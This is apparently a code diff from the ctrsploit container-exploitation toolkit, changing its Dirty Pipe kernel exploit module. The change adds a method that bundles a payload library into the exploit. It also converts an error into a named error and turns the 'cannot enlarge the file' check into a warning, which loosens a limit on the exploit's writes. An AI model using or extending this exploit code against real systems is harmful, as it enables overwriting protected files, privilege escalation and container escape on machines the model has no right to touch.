@@ -5,7 +5,9 @@ package dirty_pipe
 import (
 	"errors"
 	"fmt"
+	"github.com/ctrsploit/ctrsploit/helper/dirty-pipe/payload"
 	"github.com/ctrsploit/ctrsploit/helper/pipe-primitive"
+	"github.com/ctrsploit/ctrsploit/log"
 	"github.com/ssst0n3/awesome_libs/awesome_error"
 	"golang.org/x/sys/unix"
 	"os"
@@ -13,6 +15,10 @@ import (
 )
 
 const PageSize = 4096
+
+var (
+	ErrAcrossAPageBoundary = errors.New("cannot write across a page boundary")
+)
 
 func init() {
 	pipe_primitive.ReexecRegister(DirtyPipe{})
@@ -63,6 +69,13 @@ func (p DirtyPipe) Write(filepath string, offset int64, content []byte) (err err
 		err = errors.New("short write")
 		awesome_error.CheckErr(err)
 		return
+	}
+	return
+}
+
+func (p DirtyPipe) Library() (libraries []pipe_primitive.Library) {
+	libraries = []pipe_primitive.Library{
+		payload.Ld,
 	}
 	return
 }
@@ -119,7 +132,7 @@ func checkArgs(filePath string, offset int64, content []byte) (f *os.File, err e
 	endOffset := offset + int64(len(content))
 
 	if endOffset > nextPage {
-		err = errors.New("sorry, cannot write across a page boundary")
+		err = ErrAcrossAPageBoundary
 		awesome_error.CheckErr(err)
 		return
 	}
@@ -139,8 +152,8 @@ func checkArgs(filePath string, offset int64, content []byte) (f *os.File, err e
 
 	if endOffset > fi.Size() {
 		err = errors.New("sorry, cannot enlarge the file")
-		awesome_error.CheckErr(err)
-		return
+		log.Logger.Warn(err)
+		err = nil
 	}
 	return
 }
